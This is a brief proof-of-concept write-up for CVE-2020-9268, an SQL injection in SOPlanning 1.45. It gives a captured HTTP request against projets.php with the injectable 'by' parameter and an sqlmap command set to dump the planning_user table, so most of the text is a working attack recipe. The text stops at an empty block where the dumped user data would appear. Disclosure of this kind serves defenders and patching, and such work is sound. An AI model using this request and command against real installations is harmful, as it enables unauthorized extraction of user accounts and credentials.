CVE-2020-9268

The SOPlanning 1.45 application is vulnerable to SQL Injection which can be leveraged into getting the information for the users table.

Capture the request in Burpsuite:

```
GET /soplanning/www/projets.php?order=nom_createur&by=ASC HTTP/1.1

Host: HOSTNAME

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Encoding: gzip, deflate

```

Feed the request into SQLMap:

```
sqlmap -r projects.req --level=5 --risk=3 -p by --dbms=mysql -D soplanning -T planning_user --dump

```

Then you will be able to see the information for the users in the database:

```
